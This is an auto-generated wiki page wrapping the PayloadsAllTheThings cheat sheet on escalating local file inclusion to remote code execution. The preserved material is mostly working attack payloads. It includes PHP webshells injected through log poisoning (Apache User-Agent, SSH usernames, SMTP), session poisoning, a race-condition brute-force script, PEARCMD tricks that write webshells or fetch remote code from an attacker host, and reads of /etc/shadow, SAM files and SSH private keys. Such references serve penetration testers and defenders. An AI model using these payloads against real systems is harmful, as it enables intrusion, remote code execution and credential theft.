---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# LFI to RCE

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-file-inclusion-lfi-to-rce` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/File Inclusion/LFI-to-RCE.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [LFI to RCE](../../topics/file-inclusion/lfi-to-rce.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-file-inclusion-lfi-to-rce |
| name | LFI to RCE |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md |

## Preserved Source Material

````yaml
_body: "# LFI to RCE\n\n> LFI (Local File Inclusion) is a vulnerability that occurs when a web application includes files\
  \ from the local file system, often due to insecure handling of user input. If an attacker can control the file path, they\
  \ can potentially include sensitive or dangerous files such as system files (/etc/passwd), configuration files, or even\
  \ malicious files that could lead to Remote Code Execution (RCE).\n\n## Summary\n\n- [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)\n\
  - [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)\n- [LFI to RCE via iconv](#lfi-to-rce-via-iconv)\n\
  - [LFI to RCE via upload](#lfi-to-rce-via-upload)\n- [LFI to RCE via upload (race)](#lfi-to-rce-via-upload-race)\n- [LFI\
  \ to RCE via upload (FindFirstFile)](#lfi-to-rce-via-upload-findfirstfile)\n- [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)\n\
  - [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)\n    - [RCE via SSH](#rce-via-ssh)\n    - [RCE\
  \ via Mail](#rce-via-mail)\n    - [RCE via Apache logs](#rce-via-apache-logs)\n- [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)\n\
  - [LFI to RCE via PHP PEARCMD](#lfi-to-rce-via-php-pearcmd)\n- [LFI to RCE via Credentials Files](#lfi-to-rce-via-credentials-files)\n\
  \n## LFI to RCE via /proc/*/fd\n\n1. Upload a lot of shells (for example : 100)\n2. Include `/proc/$PID/fd/$FD` where `$PID`\
  \ is the PID of the process and `$FD` the filedescriptor. Both of them can be bruteforced.\n\n```ps1\nhttp://example.com/index.php?page=/proc/$PID/fd/$FD\n\
  ```\n\n## LFI to RCE via /proc/self/environ\n\nLike a log file, send the payload in the `User-Agent` header, it will be\
  \ reflected inside the `/proc/self/environ` file\n\n```powershell\nGET vulnerable.php?filename=../../../proc/self/environ\
  \ HTTP/1.1\nUser-Agent: <?=phpinfo(); ?>\n```\n\n## LFI to RCE via iconv\n\nUse the iconv wrapper to trigger an OOB in the\
  \ glibc (CVE-2024-2961), then use your LFI to read the memory regions from `/proc/self/maps` and to download the glibc binary.\
  \ Finally you get the RCE by exploiting the `zend_mm_heap` structure to call a `free()` that have been remapped to `system`\
  \ using `custom_heap._free`.\n\n**Requirements**:\n\n- PHP 7.0.0 (2015) to 8.3.7 (2024)\n- GNU C Library (`glibc`) <=  2.39\n\
  - Access to `convert.iconv`, `zlib.inflate`, `dechunk` filters\n\n**Exploit**:\n\n- [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)\n\
  \n## LFI to RCE via upload\n\nIf you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']);\
  \ ?>` ).\n\n```powershell\nhttp://example.com/index.php?page=path/to/uploaded/file.png\n```\n\nIn order to keep the file\
  \ readable it is best to inject into the metadata for the pictures/doc/pdf\n\n## LFI to RCE via upload (race)\n\n- Upload\
  \ a file and trigger a self-inclusion.\n- Repeat the upload a shitload of time to:\n- increase our odds of winning the race\n\
  - increase our guessing odds\n- Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}\n- Enjoy our shell.\n\n```python\nimport\
  \ itertools\nimport requests\nimport sys\n\nprint('[+] Trying to win the race')\nf = {'file': open('shell.php', 'rb')}\n\
  for _ in range(4096 * 4096):\n    requests.post('http://target.com/index.php?c=index.php', f)\n\n\nprint('[+] Bruteforcing\
  \ the inclusion')\nfor fname in itertools.combinations(string.ascii_letters + string.digits, 6):\n    url = 'http://target.com/index.php?c=/tmp/php'\
  \ + fname\n    r = requests.get(url)\n    if 'load average' in r.text:  # <?php echo system('uptime');\n        print('[+]\
  \ We have got a shell: ' + url)\n        sys.exit(0)\n\nprint('[x] Something went wrong, please try again')\n```\n\n## LFI\
  \ to RCE via upload (FindFirstFile)\n\n:warning: Only works on Windows\n\n`FindFirstFile` allows using masks (`<<` as `*`\
  \ and `>` as `?`) in LFI paths on Windows. A mask is essentially a search pattern that can include wildcard characters,\
  \ allowing users or developers to search for files or directories based on partial names or types. In the context of FindFirstFile,\
  \ masks are used to filter and match the names of files or directories.\n\n- `*`/`<<` : Represents any sequence of characters.\n\
  - `?`/`>` : Represents any single character.\n\nUpload a file, it should be stored in the temp folder `C:\\Windows\\Temp\\\
  ` with a generated name like `php[A-F0-9]{4}.tmp`.\nThen either bruteforce the 65536 filenames or use a wildcard character\
  \ like: `http://site/vuln.php?inc=c:\\windows\\temp\\php<<`\n\n## LFI to RCE via phpinfo()\n\nPHPinfo() displays the content\
  \ of any variables such as **$_GET**, **$_POST** and **$_FILES**.\n\n> By making multiple upload posts to the PHPInfo script,\
  \ and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the\
  \ LFI script specifying the temporary file name.\n\nUse the script [phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)\n\
  \n## LFI to RCE via controlled log file\n\nJust append your PHP code into the log file by doing a request to the service\
  \ (Apache, SSH..) and include the log file.\n\n```powershell\nhttp://example.com/index.php?page=/var/log/apache/access.log\n\
  http://example.com/index.php?page=/var/log/apache/error.log\nhttp://example.com/index.php?page=/var/log/apache2/access.log\n\
  http://example.com/index.php?page=/var/log/apache2/error.log\nhttp://example.com/index.php?page=/var/log/nginx/access.log\n\
  http://example.com/index.php?page=/var/log/nginx/error.log\nhttp://example.com/index.php?page=/var/log/vsftpd.log\nhttp://example.com/index.php?page=/var/log/sshd.log\n\
  http://example.com/index.php?page=/var/log/mail\nhttp://example.com/index.php?page=/var/log/httpd/error_log\nhttp://example.com/index.php?page=/usr/local/apache/log/error_log\n\
  http://example.com/index.php?page=/usr/local/apache2/log/error_log\n```\n\n### RCE via SSH\n\nTry to ssh into the box with\
  \ a PHP code as username `<?php system($_GET[\"cmd\"]);?>`.\n\n```powershell\nssh <?php system($_GET[\"cmd\"]);?>@10.10.10.10\n\
  ```\n\nThen include the SSH log files inside the Web Application.\n\n```powershell\nhttp://example.com/index.php?page=/var/log/auth.log&cmd=id\n\
  ```\n\n### RCE via Mail\n\nFirst send an email using the open SMTP then include the log file located at `http://example.com/index.php?page=/var/log/mail`.\n\
  \n```powershell\nroot@kali:~# telnet 10.10.10.10. 25\nTrying 10.10.10.10....\nConnected to 10.10.10.10..\nEscape character\
  \ is '^]'.\n220 straylight ESMTP Postfix (Debian/GNU)\nhelo ok\n250 straylight\nmail from: mail@example.com\n250 2.1.0 Ok\n\
  rcpt to: root\n250 2.1.5 Ok\ndata\n354 End data with <CR><LF>.<CR><LF>\nsubject: <?php echo system($_GET[\"cmd\"]); ?>\n\
  data2\n.\n```\n\nIn some cases you can also send the email with the `mail` command line.\n\n```powershell\nmail -s \"<?php\
  \ system($_GET['cmd']);?>\" www-data@10.10.10.10. < /dev/null\n```\n\n### RCE via Apache logs\n\nPoison the User-Agent in\
  \ access logs:\n\n```ps1\ncurl http://example.org/ -A \"<?php system(\\$_GET['cmd']);?>\"\n```\n\nNote: The logs will escape\
  \ double quotes so use single quotes for strings in the PHP payload.\n\nThen request the logs via the LFI and execute your\
  \ command.\n\n```ps1\ncurl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id\n```\n\n## LFI to RCE via\
  \ PHP sessions\n\nCheck if the website use PHP Session (PHPSESSID)\n\n```javascript\nSet-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27;\
  \ path=/\nSet-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly\n```\n\nIn PHP these sessions\
  \ are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/sessions/sess_[PHPSESSID] files\n\n```javascript\n/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.\n\
  user_ip|s:0:\"\";loggedin|s:0:\"\";lang|s:9:\"en_us.php\";win_lin|s:0:\"\";user|s:6:\"admin\";pass|s:6:\"admin\";\n```\n\
  \nSet the cookie to `<?php system('cat /etc/passwd');?>`\n\n```powershell\nlogin=1&user=<?php system(\"cat /etc/passwd\"\
  );?>&pass=password&lang=en_us.php\n```\n\nUse the LFI to include the PHP session file\n\n```powershell\nlogin=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27\n\
  ```\n\n## LFI to RCE via PHP PEARCMD\n\nPEAR is a framework and distribution system for reusable PHP components. By default\
  \ `pearcmd.php` is installed in every Docker PHP image from [hub.docker.com](https://hub.docker.com/_/php) in `/usr/local/lib/php/pearcmd.php`.\n\
  \nThe file `pearcmd.php` uses `$_SERVER['argv']` to get its arguments. The directive `register_argc_argv` must be set to\
  \ `On` in PHP configuration (`php.ini`) for this attack to work.\n\n```ini\nregister_argc_argv = On\n```\n\nThere are this\
  \ ways to exploit it.\n\n- **Method 1**: config create\n\n  ```ps1\n  /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php\n\
  \  /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();\n  ```\n\n- **Method 2**: man_dir\n\n  ```ps1\n  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+\n\
  \  /vuln.php?file=/tmp/exec.php&c=id\n  ```\n\n  The created configuration file contains the webshell.\n\n  ```php\n  #PEAR_Config\
  \ 0.9\n  a:2:{s:10:\"__channels\";a:2:{s:12:\"pecl.php.net\";a:0:{}s:5:\"__uri\";a:0:{}}s:7:\"man_dir\";s:29:\"<?echo(system($_GET['c']));?>\"\
  ;}\n  ```\n\n- **Method 3**: download (need external network connection).\n\n  ```ps1\n  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php\n\
  \  /vuln.php?file=exec.php&c=id\n  ```\n\n- **Method 4**: install (need external network connection). Notice that `exec.php`\
  \ locates at `/tmp/pear/download/exec.php`.\n\n  ```ps1\n  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php\n\
  \  /vuln.php?file=/tmp/pear/download/exec.php&c=id\n  ```\n\n## LFI to RCE via credentials files\n\nThis method require\
  \ high privileges inside the application in order to read the sensitive files.\n\n### Windows version\n\nExtract `sam` and\
  \ `system` files.\n\n```powershell\nhttp://example.com/index.php?page=../../../../../../WINDOWS/repair/sam\nhttp://example.com/index.php?page=../../../../../../WINDOWS/repair/system\n\
  ```\n\nThen extract hashes from these files `samdump2 SYSTEM SAM > hashes.txt`, and crack them with `hashcat/john` or replay\
  \ them using the Pass The Hash technique.\n\n### Linux version\n\nExtract `/etc/shadow` files.\n\n```powershell\nhttp://example.com/index.php?page=../../../../../../etc/shadow\n\
  ```\n\nThen crack the hashes inside in order to login via SSH on the machine.\n\nAnother way to gain SSH access to a Linux\
  \ machine through LFI is by reading the private SSH key file: `id_rsa`.\nIf SSH is active, check which user is being used\
  \ in the machine by including the content of `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa` for every user with a\
  \ home.\n\n## References\n\n- [LFI WITH PHPINFO() ASSISTANCE - Brett Moore - April 6, 2017](https://web.archive.org/web/20170406225317/https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)\n\
  - [LFI2RCE via PHP Filters - HackTricks - July 19, 2024](https://web.archive.org/web/20220819000915/https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)\n\
  - [Local file inclusion tricks - Johan Adriaans - August 4, 2007](https://web.archive.org/web/20250403080651/http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)\n\
  - [PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - Gynvael Coldwind - March 18, 2011](https://web.archive.org/web/20110429042455/http://gynvael.coldwind.pl:80/?id=376)\n\
  - [PHP LFI with Nginx Assistance - Bruno Bierbaumer - December 26, 2021](https://web.archive.org/web/20250604035904/https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)\n\
  - [Upgrade from LFI to RCE via PHP Sessions - Reiners - September 14, 2017](https://web.archive.org/web/20170914211708/https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)"
_relative_path: File Inclusion/LFI-to-RCE.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/File Inclusion/LFI-to-RCE.md
````
